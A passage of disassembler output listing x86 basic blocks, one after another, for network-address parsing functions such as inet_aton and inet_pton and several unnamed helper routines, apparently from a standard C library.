|
|
v
0xb1036d0:	push	ebp
0xb1036d1:	push	edi
0xb1036d2:	push	esi
0xb1036d3:	push	ebx
0xb1036d4:	call	0xb1267db
None
|
|
|
v
0xb103721:	test	eax, eax
0xb103723:	js	0xb103748
None
|
|
|
v
0xb103770:	mov	dword ptr [ebp + edx], 0x26
0xb103778:	add	esp, 0x3c
0xb10377b:	xor	eax, eax
0xb10377d:	pop	ebx
0xb10377e:	pop	esi
0xb10377f:	pop	edi
0xb103780:	pop	ebp
0xb103781:	ret	
None
|
|
|
v
0xb103748:	mov	ebp, dword ptr gs:[0]
0xb10374f:	mov	ecx, esi
0xb103751:	mov	edx, dword ptr [ebx - 0xdc]
0xb103757:	mov	edi, dword ptr [ebp + edx]
0xb10375b:	xchg	ebx, ecx
0xb10375d:	mov	eax, 6
0xb103762:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb1036d9:	add	ebx, 0xa7927
0xb1036df:	sub	esp, 0x3c
0xb1036e2:	call	0xb0edae0
None
|
|
|
v
0xb1036e7:	test	eax, eax
0xb1036e9:	mov	esi, eax
0xb1036eb:	js	0xb103778
None
|
|
|
v
0xb10370d:	mov	dword ptr [esp + 8], edi
0xb103711:	mov	dword ptr [esp + 4], 0x8933
0xb103719:	mov	dword ptr [esp], esi
0xb10371c:	call	0xb0e30e0
None
|
|
|
v
0xb103778:	add	esp, 0x3c
0xb10377b:	xor	eax, eax
0xb10377d:	pop	ebx
0xb10377e:	pop	esi
0xb10377f:	pop	edi
0xb103780:	pop	ebp
0xb103781:	ret	
None
|
|
|
v
0xb103769:	xchg	ebx, ecx
0xb10376b:	cmp	edi, 0x16
0xb10376e:	jne	0xb103778
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b109390
TOTAL BLOCKS :21
0xb109390:	push	ebp
0xb109391:	push	edi
0xb109392:	push	esi
0xb109393:	push	ebx
0xb109394:	sub	esp, 0x2c
0xb109397:	mov	esi, dword ptr [esp + 0x48]
0xb10939b:	call	0xb1267db
None
|
|
|
v
0xb109446:	mov	ecx, dword ptr [esp + 0x40]
0xb10944a:	mov	dword ptr [ecx], eax
0xb10944c:	add	esp, 0x2c
0xb10944f:	pop	ebx
0xb109450:	pop	esi
0xb109451:	pop	edi
0xb109452:	pop	ebp
0xb109453:	ret	
None
|
|
|
v
0xb10942d:	mov	eax, dword ptr [esp + 0x44]
0xb109431:	mov	dword ptr [eax], ebp
0xb109433:	mov	eax, dword ptr [esp + 0x1c]
0xb109437:	shl	ebp, 5
0xb10943a:	mov	dword ptr [esp + 4], ebp
0xb10943e:	mov	dword ptr [esp], eax
0xb109441:	call	0xb0173e0
None
|
|
|
v
0xb1094ab:	jmp	0xb1093b0
None
|
|
|
v
0xb1094a5:	test	eax, eax
0xb1094a7:	mov	edi, eax
0xb1094a9:	js	0xb109480
None
|
|
|
v
0xb1093dc:	mov	eax, dword ptr [esp + 0x18]
0xb1093e0:	test	eax, eax
0xb1093e2:	mov	edx, eax
0xb1093e4:	je	0xb109458
None
|
|
|
v
0xb1093b0:	lea	ebp, dword ptr [esp + 0x18]
0xb1093b4:	mov	dword ptr [esp + 8], ebp
0xb1093b8:	mov	dword ptr [esp + 4], 0x8912
0xb1093c0:	mov	dword ptr [esp], edi
0xb1093c3:	mov	dword ptr [esp + 0x1c], 0
0xb1093cb:	mov	dword ptr [esp + 0x18], 0
0xb1093d3:	call	0xb0e30e0
None
|
|
|
v
0xb109416:	test	eax, eax
0xb109418:	js	0xb109468
None
|
|
|
v
0xb1093d8:	test	eax, eax
0xb1093da:	js	0xb109458
None
|
|
|
v
0xb1093e6:	mov	dword ptr [esp + 0x18], eax
0xb1093ea:	mov	eax, dword ptr [esp + 0x1c]
0xb1093ee:	mov	dword ptr [esp + 4], edx
0xb1093f2:	mov	dword ptr [esp], eax
0xb1093f5:	call	0xb0173e0
None
|
|
|
v
0xb1093a0:	add	ebx, 0xa1c60
0xb1093a6:	test	esi, esi
0xb1093a8:	mov	edi, esi
0xb1093aa:	js	0xb1094a0
None
|
|
|
v
0xb1094a0:	call	0xb0edae0
None
|
|
|
v
0xb1093fa:	test	eax, eax
0xb1093fc:	je	0xb109468
None
|
|
|
v
0xb109468:	mov	eax, dword ptr [esp + 0x1c]
0xb10946c:	mov	dword ptr [esp], eax
0xb10946f:	call	0xb017470
None
|
|
|
v
0xb109458:	mov	edx, 0x80
0xb10945d:	mov	eax, 0x80
0xb109462:	jmp	0xb1093e6
None
|
|
|
v
0xb10941a:	mov	ebp, dword ptr [esp + 0x18]
0xb10941e:	shr	ebp, 5
0xb109421:	cmp	edi, esi
0xb109423:	je	0xb10942d
None
|
|
|
v
0xb109425:	mov	dword ptr [esp], edi
0xb109428:	call	0xb0db860
None
|
|
|
v
0xb109474:	cmp	edi, esi
0xb109476:	je	0xb109480
None
|
|
|
v
0xb1093fe:	mov	dword ptr [esp + 8], ebp
0xb109402:	mov	dword ptr [esp + 4], 0x8912
0xb10940a:	mov	dword ptr [esp], edi
0xb10940d:	mov	dword ptr [esp + 0x1c], eax
0xb109411:	call	0xb0e30e0
None
|
|
|
v
0xb109478:	mov	dword ptr [esp], edi
0xb10947b:	call	0xb0db860
None
|
|
|
v
0xb109480:	mov	eax, dword ptr [esp + 0x44]
0xb109484:	mov	dword ptr [eax], 0
0xb10948a:	mov	eax, dword ptr [esp + 0x40]
0xb10948e:	mov	dword ptr [eax], 0
0xb109494:	add	esp, 0x2c
0xb109497:	pop	ebx
0xb109498:	pop	esi
0xb109499:	pop	edi
0xb10949a:	pop	ebp
0xb10949b:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:inet_aton
TOTAL BLOCKS :23
0xb10967c:	cmp	eax, 0xff
0xb10967f:	je	0xb1096c8
None
|
|
|
v
0xb10972f:	jmp	0xb1096e0
None
|
|
|
v
0xb10964a:	lea	eax, dword ptr [esp + 0x28]
0xb10964e:	mov	dword ptr [esp + 0x1c], eax
0xb109652:	mov	ebp, eax
0xb109654:	lea	eax, dword ptr [esp + 0x2c]
0xb109658:	mov	dword ptr [esp + 0x10], eax
0xb10965c:	lea	eax, dword ptr [esp + 0x2b]
0xb109660:	mov	dword ptr [esp + 0x14], eax
0xb109664:	mov	eax, dword ptr [esp + 0x10]
0xb109668:	mov	dword ptr [esp + 8], 0
0xb109670:	mov	dword ptr [esp], esi
0xb109673:	mov	dword ptr [esp + 4], eax
0xb109677:	call	0xb0346e0
None
|
|
|
v
0xb109600:	push	ebp
0xb109601:	push	edi
0xb109602:	mov	edi, dword ptr gs:[0]
0xb109609:	push	esi
0xb10960a:	push	ebx
0xb10960b:	call	0xb1267db
None
|
|
|
v
0xb109664:	mov	eax, dword ptr [esp + 0x10]
0xb109668:	mov	dword ptr [esp + 8], 0
0xb109670:	mov	dword ptr [esp], esi
0xb109673:	mov	dword ptr [esp + 4], eax
0xb109677:	call	0xb0346e0
None
|
|
|
v
0xb10971b:	js	0xb1096b0
None
|
|
|
v
0xb109707:	mov	eax, dword ptr [ebx - 0xdc]
0xb10970d:	mov	esi, dword ptr [esp + 0x18]
0xb109711:	mov	dword ptr [edi + eax], esi
0xb109714:	mov	eax, 1
0xb109719:	jmp	0xb1096bf
None
|
|
|
v
0xb10971d:	mov	edx, ecx
0xb10971f:	mov	ecx, dword ptr [ebx - 0x110]
0xb109725:	mov	ecx, dword ptr [edi + ecx]
0xb109728:	test	byte ptr [ecx + edx*2 + 1], 0x20
0xb10972d:	je	0xb1096b0
None
|
|
|
v
0xb1096c8:	mov	ecx, dword ptr [ebx - 0xdc]
0xb1096ce:	cmp	dword ptr [edi + ecx], 0x22
0xb1096d2:	jne	0xb109681
None
|
|
|
v
0xb1096d4:	jmp	0xb1096b0
None
|
|
|
v
0xb1096af:	nop	
None
|
|
|
v
0xb109610:	add	ebx, 0xa19f0
0xb109616:	sub	esp, 0x3c
0xb109619:	mov	esi, dword ptr [esp + 0x50]
0xb10961d:	mov	dword ptr [esp + 0x28], 0
0xb109625:	mov	eax, dword ptr [ebx - 0xdc]
0xb10962b:	mov	eax, dword ptr [edi + eax]
0xb10962e:	mov	dword ptr [esp + 0x18], eax
0xb109632:	mov	eax, dword ptr [ebx - 0xdc]
0xb109638:	mov	dword ptr [edi + eax], 0
0xb10963f:	movsx	eax, byte ptr [esi]
0xb109642:	sub	eax, 0x30
0xb109645:	cmp	eax, 9
0xb109648:	ja	0xb1096b0
None
|
|
|
v
0xb1096fb:	mov	esi, dword ptr [esp + 0x54]
0xb1096ff:	bswap	eax
0xb109701:	or	eax, dword ptr [esp + 0x28]
0xb109705:	mov	dword ptr [esi], eax
0xb109707:	mov	eax, dword ptr [ebx - 0xdc]
0xb10970d:	mov	esi, dword ptr [esp + 0x18]
0xb109711:	mov	dword ptr [edi + eax], esi
0xb109714:	mov	eax, 1
0xb109719:	jmp	0xb1096bf
None
|
|
|
v
0xb10969a:	add	ebp, 1
0xb10969d:	mov	byte ptr [ebp - 1], al
0xb1096a0:	movsx	eax, byte ptr [edx + 1]
0xb1096a4:	lea	esi, dword ptr [edx + 1]
0xb1096a7:	sub	eax, 0x30
0xb1096aa:	cmp	eax, 9
0xb1096ad:	jbe	0xb109664
None
|
|
|
v
0xb1096d8:	test	cl, cl
0xb1096da:	mov	dword ptr [esp + 0x10], edx
0xb1096de:	jne	0xb10971b
None
|
|
|
v
0xb1096bf:	add	esp, 0x3c
0xb1096c2:	pop	ebx
0xb1096c3:	pop	esi
0xb1096c4:	pop	edi
0xb1096c5:	pop	ebp
0xb1096c6:	ret	
None
|
|
|
v
0xb10968d:	cmp	ebp, dword ptr [esp + 0x14]
0xb109691:	je	0xb1096b0
None
|
|
|
v
0xb1096e0:	cmp	dword ptr [esp + 0x10], esi
0xb1096e4:	je	0xb1096b0
None
|
|
|
v
0xb1096e6:	sub	ebp, dword ptr [esp + 0x1c]
0xb1096ea:	cmp	dword ptr [ebx + ebp*4 - 0x4c9e8], eax
0xb1096f1:	jb	0xb1096b0
None
|
|
|
v
0xb1096f3:	mov	edx, dword ptr [esp + 0x54]
0xb1096f7:	test	edx, edx
0xb1096f9:	je	0xb109707
None
|
|
|
v
0xb109681:	mov	edx, dword ptr [esp + 0x2c]
0xb109685:	movsx	ecx, byte ptr [edx]
0xb109688:	cmp	cl, 0x2e
0xb10968b:	jne	0xb1096d8
None
|
|
|
v
0xb1096b0:	mov	eax, dword ptr [ebx - 0xdc]
0xb1096b6:	mov	ecx, dword ptr [esp + 0x18]
0xb1096ba:	mov	dword ptr [edi + eax], ecx
0xb1096bd:	xor	eax, eax
0xb1096bf:	add	esp, 0x3c
0xb1096c2:	pop	ebx
0xb1096c3:	pop	esi
0xb1096c4:	pop	edi
0xb1096c5:	pop	ebp
0xb1096c6:	ret	
None
|
|
|
v
0xb109693:	cmp	eax, 0xff
0xb109698:	ja	0xb1096b0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b109ad0
TOTAL BLOCKS :17
0xb109b17:	test	al, al
0xb109b19:	je	0xb109b90
None
|
|
|
v
0xb109b65:	test	ecx, ecx
0xb109b67:	je	0xb109b90
None
|
|
|
v
0xb109aff:	lea	edx, dword ptr [edi - 0x30]
0xb109b02:	cmp	edx, 9
0xb109b05:	ja	0xb109b60
None
|
|
|
v
0xb109b23:	test	ecx, ecx
0xb109b25:	mov	byte ptr [esi], dl
0xb109b27:	jne	0xb109b80
None
|
|
|
v
0xb109b90:	add	esp, 0x18
0xb109b93:	xor	eax, eax
0xb109b95:	pop	esi
0xb109b96:	pop	edi
0xb109b97:	pop	ebp
0xb109b98:	ret	
None
|
|
|
v
0xb109b29:	add	ebp, 1
0xb109b2c:	cmp	ebp, 4
0xb109b2f:	jg	0xb109b90
None
|
|
|
v
0xb109b6e:	mov	byte ptr [esi + 1], 0
0xb109b72:	xor	ecx, ecx
0xb109b74:	add	esi, 1
0xb109b77:	jmp	0xb109af0
None
|
|
|
v
0xb109b31:	add	dword ptr [esp], 1
0xb109b35:	mov	cl, 1
0xb109b37:	mov	eax, dword ptr [esp]
0xb109b3a:	movsx	edi, byte ptr [eax - 1]
0xb109b3e:	test	edi, edi
0xb109b40:	jne	0xb109aff
None
|
|
|
v
0xb109b60:	cmp	edi, 0x2e
0xb109b63:	jne	0xb109b90
None
|
|
|
v
0xb109b80:	mov	ecx, 1
0xb109b85:	jmp	0xb109af0
None
|
|
|
v
0xb109ad0:	push	ebp
0xb109ad1:	xor	ecx, ecx
0xb109ad3:	push	edi
0xb109ad4:	xor	ebp, ebp
0xb109ad6:	push	esi
0xb109ad7:	sub	esp, 0x18
0xb109ada:	mov	dword ptr [esp + 4], edx
0xb109ade:	lea	esi, dword ptr [esp + 0x14]
0xb109ae2:	mov	byte ptr [esp + 0x14], 0
0xb109ae7:	mov	dword ptr [esp], eax
0xb109aea:	lea	esi, dword ptr [esi]
0xb109af0:	add	dword ptr [esp], 1
0xb109af4:	mov	eax, dword ptr [esp]
0xb109af7:	movsx	edi, byte ptr [eax - 1]
0xb109afb:	test	edi, edi
0xb109afd:	je	0xb109b42
None
|
|
|
v
0xb109b69:	cmp	ebp, 4
0xb109b6c:	je	0xb109b90
None
|
|
|
v
0xb109b1b:	cmp	edx, 0xff
0xb109b21:	ja	0xb109b90
None
|
|
|
v
0xb109b07:	movzx	eax, byte ptr [esi]
0xb109b0a:	test	ecx, ecx
0xb109b0c:	movzx	edi, al
0xb109b0f:	lea	edi, dword ptr [edi + edi*4]
0xb109b12:	lea	edx, dword ptr [edx + edi*2]
0xb109b15:	je	0xb109b1b
None
|
|
|
v
0xb109b42:	cmp	ebp, 3
0xb109b45:	jle	0xb109b90
None
|
|
|
v
0xb109b47:	mov	eax, dword ptr [esp + 0x14]
0xb109b4b:	mov	esi, dword ptr [esp + 4]
0xb109b4f:	mov	dword ptr [esi], eax
0xb109b51:	add	esp, 0x18
0xb109b54:	mov	eax, 1
0xb109b59:	pop	esi
0xb109b5a:	pop	edi
0xb109b5b:	pop	ebp
0xb109b5c:	ret	
None
|
|
|
v
0xb109af0:	add	dword ptr [esp], 1
0xb109af4:	mov	eax, dword ptr [esp]
0xb109af7:	movsx	edi, byte ptr [eax - 1]
0xb109afb:	test	edi, edi
0xb109afd:	je	0xb109b42
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:inet_pton
TOTAL BLOCKS :41
0xb109df0:	mov	eax, dword ptr [esp + 0x24]
0xb109df4:	mov	dword ptr [esp + 0x2c], esi
0xb109df8:	mov	dword ptr [esp + 0x28], eax
0xb109dfc:	jmp	0xb109c87
None
|
|
|
v
0xb109e0a:	mov	eax, dword ptr [esp + 0x24]
0xb109e0e:	lea	esi, dword ptr [eax + 4]
0xb109e11:	cmp	dword ptr [esp + 0x20], esi
0xb109e15:	jb	0xb109d80
None
|
|
|
v
0xb109dd8:	cmp	byte ptr [esi + 1], 0x3a
0xb109ddc:	jne	0xb109d80
None
|
|
|
v
0xb109ca4:	mov	esi, edi
0xb109ca6:	add	esi, 2
0xb109ca9:	cmp	dword ptr [esp + 0x20], esi
0xb109cad:	jb	0xb109d80
None
|
|
|
v
0xb109e32:	xor	eax, eax
0xb109e34:	jmp	0xb109d82
None
|
|
|
v
0xb109da2:	mov	edi, dword ptr [esp + 0x24]
0xb109da6:	mov	eax, edi
0xb109da8:	add	eax, 2
0xb109dab:	cmp	dword ptr [esp + 0x20], eax
0xb109daf:	jb	0xb109d80
None
|
|
|
v
0xb109d60:	mov	edx, dword ptr [esp + 0x68]
0xb109d64:	mov	eax, esi
0xb109d66:	call	0xb109ad0
None
|
|
|
v
0xb109bc3:	cmp	eax, 0xa
0xb109bc6:	jne	0xb109d38
None
|
|
|
v
0xb109c4d:	mov	dword ptr [esp], ecx
0xb109c50:	mov	dword ptr [esp + 4], edi
0xb109c54:	mov	dword ptr [esp + 0x10], ecx
0xb109c58:	call	0xb07a520
None
|
|
|
v
0xb109c7f:	mov	dword ptr [esp + 0x18], 1
0xb109c87:	movsx	eax, byte ptr [esi]
0xb109c8a:	add	esi, 1
0xb109c8d:	mov	edi, dword ptr [esp + 0x14]
0xb109c91:	mov	edi, dword ptr [edi + eax*4]
0xb109c94:	test	edi, edi
0xb109c96:	jne	0xb109c4d
None
|
|
|
v
0xb109cb3:	mov	ecx, ebp
0xb109cb5:	mov	edx, ebp
0xb109cb7:	shr	ecx, 8
0xb109cba:	mov	byte ptr [edi], cl
0xb109cbc:	mov	dword ptr [esp + 0x24], esi
0xb109cc0:	mov	byte ptr [edi + 1], dl
0xb109cc3:	mov	esi, dword ptr [esp + 0x28]
0xb109cc7:	mov	eax, dword ptr [esp + 0x24]
0xb109ccb:	test	esi, esi
0xb109ccd:	je	0xb109d73
None
|
|
|
v
0xb109d73:	cmp	dword ptr [esp + 0x20], eax
0xb109d77:	je	0xb109d0d
None
|
|
|
v
0xb109d95:	mov	eax, dword ptr [esp + 0x18]
0xb109d99:	test	eax, eax
0xb109d9b:	je	0xb109de8
None
|
|
|
v
0xb109d79:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb109ba0:	push	ebp
0xb109ba1:	push	edi
0xb109ba2:	push	esi
0xb109ba3:	push	ebx
0xb109ba4:	sub	esp, 0x4c
0xb109ba7:	mov	eax, dword ptr [esp + 0x60]
0xb109bab:	call	0xb1267db
None
|
|
|
v
0xb109d82:	add	esp, 0x4c
0xb109d85:	pop	ebx
0xb109d86:	pop	esi
0xb109d87:	pop	edi
0xb109d88:	pop	ebp
0xb109d89:	ret	
None
|
|
|
v
0xb109ce1:	mov	ecx, edx
0xb109ce3:	xor	eax, eax
0xb109ce5:	mov	edi, dword ptr [esp + 0x1c]
0xb109ce9:	neg	ecx
0xb109ceb:	add	esi, edx
0xb109ced:	test	edx, edx
0xb109cef:	jle	0xb109d0d
None
|
|
|
v
0xb109d51:	add	esp, 0x4c
0xb109d54:	pop	ebx
0xb109d55:	pop	esi
0xb109d56:	pop	edi
0xb109d57:	pop	ebp
0xb109d58:	ret	
None
|
|
|
v
0xb109d6b:	add	esp, 0x4c
0xb109d6e:	pop	ebx
0xb109d6f:	pop	esi
0xb109d70:	pop	edi
0xb109d71:	pop	ebp
0xb109d72:	ret	
None
|
|
|
v
0xb109c87:	movsx	eax, byte ptr [esi]
0xb109c8a:	add	esi, 1
0xb109c8d:	mov	edi, dword ptr [esp + 0x14]
0xb109c91:	mov	edi, dword ptr [edi + eax*4]
0xb109c94:	test	edi, edi
0xb109c96:	jne	0xb109c4d
None
|
|
|
v
0xb109dde:	add	esi, 1
0xb109de1:	jmp	0xb109c07
None
|
|
|
v
0xb109e1b:	mov	edx, eax
0xb109e1d:	mov	eax, dword ptr [esp + 0x2c]
0xb109e21:	call	0xb109ad0
None
|
|
|
v
0xb109cc3:	mov	esi, dword ptr [esp + 0x28]
0xb109cc7:	mov	eax, dword ptr [esp + 0x24]
0xb109ccb:	test	esi, esi
0xb109ccd:	je	0xb109d73
None
|
|
|
v
0xb109de8:	mov	edi, dword ptr [esp + 0x28]
0xb109dec:	test	edi, edi
0xb109dee:	jne	0xb109d80
None
|
|
|
v
0xb109e01:	cmp	edi, 0x2e
0xb109e04:	jne	0xb109d80
None
|
|
|
v
0xb109cf8:	movzx	edx, byte ptr [esi + eax - 1]
0xb109cfd:	mov	byte ptr [edi + eax + 0xf], dl
0xb109d01:	mov	byte ptr [esi + eax - 1], 0
0xb109d06:	sub	eax, 1
0xb109d09:	cmp	eax, ecx
0xb109d0b:	jne	0xb109cf8
None
|
|
|
v
0xb109d90:	cmp	edi, 0x3a
0xb109d93:	jne	0xb109e01
None
|
|
|
v
0xb109bcc:	lea	eax, dword ptr [esp + 0x30]
0xb109bd0:	mov	dword ptr [esp + 0x1c], eax
0xb109bd4:	lea	eax, dword ptr [esp + 0x40]
0xb109bd8:	mov	dword ptr [esp + 0x20], eax
0xb109bdc:	movsx	eax, byte ptr [esi]
0xb109bdf:	mov	dword ptr [esp + 0x30], 0
0xb109be7:	mov	dword ptr [esp + 0x34], 0
0xb109bef:	mov	dword ptr [esp + 0x38], 0
0xb109bf7:	cmp	al, 0x3a
0xb109bf9:	mov	dword ptr [esp + 0x3c], 0
0xb109c01:	je	0xb109dd8
None
|
|
|
v
0xb109cf1:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb109c07:	mov	ecx, dword ptr gs:[0]
0xb109c0e:	xor	ebp, ebp
0xb109c10:	mov	edx, dword ptr [ebx - 0x80]
0xb109c16:	mov	dword ptr [esp + 0x2c], esi
0xb109c1a:	add	esi, 1
0xb109c1d:	mov	dword ptr [esp + 0x18], 0
0xb109c25:	mov	dword ptr [esp + 0x28], 0
0xb109c2d:	mov	edi, dword ptr [ecx + edx]
0xb109c30:	mov	ecx, dword ptr [esp + 0x1c]
0xb109c34:	mov	dword ptr [esp + 0x14], edi
0xb109c38:	mov	edi, dword ptr [esp + 0x14]
0xb109c3c:	mov	dword ptr [esp + 0x24], ecx
0xb109c40:	lea	ecx, dword ptr [ebx - 0x475f7]
0xb109c46:	mov	edi, dword ptr [edi + eax*4]
0xb109c49:	test	edi, edi
0xb109c4b:	je	0xb109c98
None
|
|
|
v
0xb109c69:	mov	edx, ebp
0xb109c6b:	sub	eax, ecx
0xb109c6d:	shl	edx, 4
0xb109c70:	or	eax, edx
0xb109c72:	cmp	eax, 0xffff
0xb109c77:	mov	ebp, eax
0xb109c79:	ja	0xb109d80
None
|
|
|
v
0xb109cd3:	mov	edx, eax
0xb109cd5:	sub	edx, esi
0xb109cd7:	cmp	dword ptr [esp + 0x20], eax
0xb109cdb:	je	0xb109d80
None
|
|
|
v
0xb109d0d:	mov	esi, dword ptr [esp + 0x68]
0xb109d11:	mov	eax, dword ptr [esp + 0x30]
0xb109d15:	mov	dword ptr [esi], eax
0xb109d17:	mov	eax, dword ptr [esp + 0x34]
0xb109d1b:	mov	dword ptr [esi + 4], eax
0xb109d1e:	mov	eax, dword ptr [esp + 0x38]
0xb109d22:	mov	dword ptr [esi + 8], eax
0xb109d25:	mov	eax, dword ptr [esp + 0x3c]
0xb109d29:	mov	dword ptr [esi + 0xc], eax
0xb109d2c:	mov	eax, 1
0xb109d31:	jmp	0xb109d51
None
|
|
|
v
0xb109c5d:	mov	ecx, dword ptr [esp + 0x10]
0xb109c61:	test	eax, eax
0xb109c63:	je	0xb109d90
None
|
|
|
v
0xb109db1:	mov	edx, ebp
0xb109db3:	shr	edx, 8
0xb109db6:	mov	byte ptr [edi], dl
0xb109db8:	mov	edx, ebp
0xb109dba:	xor	ebp, ebp
0xb109dbc:	mov	byte ptr [edi + 1], dl
0xb109dbf:	mov	dword ptr [esp + 0x2c], esi
0xb109dc3:	mov	dword ptr [esp + 0x24], eax
0xb109dc7:	mov	dword ptr [esp + 0x18], 0
0xb109dcf:	jmp	0xb109c87
None
|
|
|
v
0xb109c98:	mov	edx, dword ptr [esp + 0x18]
0xb109c9c:	mov	edi, dword ptr [esp + 0x24]
0xb109ca0:	test	edx, edx
0xb109ca2:	je	0xb109cc3
None
|
|
|
v
0xb109d38:	mov	eax, dword ptr [ebx - 0xdc]
0xb109d3e:	mov	edx, dword ptr gs:[0]
0xb109d45:	mov	dword ptr [edx + eax], 0x61
0xb109d4c:	mov	eax, 0xffffffff
0xb109d51:	add	esp, 0x4c
0xb109d54:	pop	ebx
0xb109d55:	pop	esi
0xb109d56:	pop	edi
0xb109d57:	pop	ebp
0xb109d58:	ret	
None
|
|
|
v
0xb109e26:	mov	dword ptr [esp + 0x24], esi
0xb109e2a:	test	eax, eax
0xb109e2c:	jg	0xb109cc3
None
|
|
|
v
0xb109bb0:	add	ebx, 0xa1450
0xb109bb6:	mov	esi, dword ptr [esp + 0x64]
0xb109bba:	cmp	eax, 2
0xb109bbd:	je	0xb109d60
None
|
|
|
v
0xb109d9d:	cmp	byte ptr [esi], 0
0xb109da0:	je	0xb109d80
None
|
|
|
v
0xb109d80:	xor	eax, eax
0xb109d82:	add	esp, 0x4c
0xb109d85:	pop	ebx
0xb109d86:	pop	esi
0xb109d87:	pop	edi
0xb109d88:	pop	ebp
0xb109d89:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10a020
TOTAL BLOCKS :43
0xb10a0b7:	mov	esi, dword ptr [esp + 0x18]
0xb10a0bb:	xor	edi, edi
0xb10a0bd:	lea	esi, dword ptr [esi]
0xb10a0c0:	movzx	eax, byte ptr [esi + 0x16]
0xb10a0c4:	mov	dword ptr [esp + 4], esi
0xb10a0c8:	mov	dword ptr [esp], ebp
0xb10a0cb:	mov	dword ptr [esp + 8], eax
0xb10a0cf:	call	0xb082ed0
None
|
|
|
v
0xb10a067:	mov	ecx, 6
0xb10a06c:	mov	esi, ebp
0xb10a06e:	lea	edi, dword ptr [ebx - 0x475e6]
0xb10a074:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a178:	lea	eax, dword ptr [ebp + 8]
0xb10a17b:	mov	dword ptr [esp + 8], 0xa
0xb10a183:	mov	dword ptr [esp + 4], 0
0xb10a18b:	mov	dword ptr [esp], eax
0xb10a18e:	call	0xb034640
None
|
|
|
v
0xb10a14b:	cmp	eax, 0xf
0xb10a14e:	jg	0xb10a1e8
None
|
|
|
v
0xb10a220:	or	dword ptr [ecx + 8], eax
0xb10a223:	jmp	0xb10a0e8
None
|
|
|
v
0xb10a0a0:	je	0xb10a1b0
None
|
|
|
v
0xb10a130:	lea	eax, dword ptr [ebp + 6]
0xb10a133:	mov	dword ptr [esp + 8], 0xa
0xb10a13b:	mov	dword ptr [esp + 4], 0
0xb10a143:	mov	dword ptr [esp], eax
0xb10a146:	call	0xb034640
None
|
|
|
v
0xb10a218:	and	dword ptr [ecx + 8], eax
0xb10a21b:	jmp	0xb10a0e8
None
|
|
|
v
0xb10a200:	imul	edi, edi, 0x1c
0xb10a203:	mov	eax, dword ptr [esp + 0x18]
0xb10a207:	mov	ecx, dword ptr [esp + 0x14]
0xb10a20b:	lea	eax, dword ptr [eax + edi + 0x10]
0xb10a20f:	cmp	byte ptr [eax + 7], 0
0xb10a213:	mov	eax, dword ptr [eax + 8]
0xb10a216:	je	0xb10a220
None
|
|
|
v
0xb10a193:	mov	ecx, dword ptr [esp + 0x14]
0xb10a197:	mov	edx, 0x1e
0xb10a19c:	cmp	eax, 0x1e
0xb10a19f:	cmovg	eax, edx
0xb10a1a2:	mov	dword ptr [ecx], eax
0xb10a1a4:	jmp	0xb10a0e8
None
|
|
|
v
0xb10a058:	add	ebp, 1
0xb10a05b:	movzx	eax, byte ptr [ebp]
0xb10a05f:	cmp	al, 9
0xb10a061:	je	0xb10a058
None
|
|
|
v
0xb10a1e8:	mov	eax, dword ptr [esp + 0x14]
0xb10a1ec:	or	byte ptr [eax + 0x164], 0xf
0xb10a1f3:	jmp	0xb10a0e8
None
|
|
|
v
0xb10a091:	mov	ecx, 9
0xb10a096:	mov	esi, ebp
0xb10a098:	lea	edi, dword ptr [ebx - 0x475d6]
0xb10a09e:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a154:	mov	esi, dword ptr [esp + 0x14]
0xb10a158:	and	eax, 0xf
0xb10a15b:	movzx	ecx, byte ptr [esi + 0x164]
0xb10a162:	mov	edx, ecx
0xb10a164:	and	edx, 0xfffffff0
0xb10a167:	or	eax, edx
0xb10a169:	mov	byte ptr [esp + 0x1f], cl
0xb10a16d:	mov	byte ptr [esi + 0x164], al
0xb10a173:	jmp	0xb10a0e8
None
|
|
|
v
0xb10a0e7:	nop	
None
|
|
|
v
0xb10a100:	add	ebp, 1
0xb10a103:	movzx	eax, byte ptr [ebp]
0xb10a107:	test	al, 0xdf
0xb10a109:	je	0xb10a048
None
|
|
|
v
0xb10a02b:	add	ebx, 0xa0fd5
0xb10a031:	sub	esp, 0x2c
0xb10a034:	mov	dword ptr [esp + 0x14], eax
0xb10a038:	movzx	eax, byte ptr [edx]
0xb10a03b:	lea	edx, dword ptr [ebx - 0x4c9c0]
0xb10a041:	mov	dword ptr [esp + 0x18], edx
0xb10a045:	lea	esi, dword ptr [esi]
0xb10a048:	test	al, al
0xb10a04a:	je	0xb10a1f8
None
|
|
|
v
0xb10a0a6:	mov	ecx, 5
0xb10a0ab:	mov	esi, ebp
0xb10a0ad:	lea	edi, dword ptr [ebx - 0x475cc]
0xb10a0b3:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a050:	cmp	al, 0x20
0xb10a052:	jne	0xb10a120
None
|
|
|
v
0xb10a0b5:	je	0xb10a0e8
None
|
|
|
v
0xb10a113:	mov	eax, 9
0xb10a118:	cmp	al, 0x20
0xb10a11a:	je	0xb10a058
None
|
|
|
v
0xb10a048:	test	al, al
0xb10a04a:	je	0xb10a1f8
None
|
|
|
v
0xb10a0c0:	movzx	eax, byte ptr [esi + 0x16]
0xb10a0c4:	mov	dword ptr [esp + 4], esi
0xb10a0c8:	mov	dword ptr [esp], ebp
0xb10a0cb:	mov	dword ptr [esp + 8], eax
0xb10a0cf:	call	0xb082ed0
None
|
|
|
v
0xb10a10f:	cmp	al, 9
0xb10a111:	jne	0xb10a100
None
|
|
|
v
0xb10a128:	jmp	0xb10a067
None
|
|
|
v
0xb10a0e8:	movzx	eax, byte ptr [ebp]
0xb10a0ec:	test	al, 0xdf
0xb10a0ee:	je	0xb10a048
None
|
|
|
v
0xb10a074:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a0f4:	cmp	al, 9
0xb10a0f6:	je	0xb10a050
None
|
|
|
v
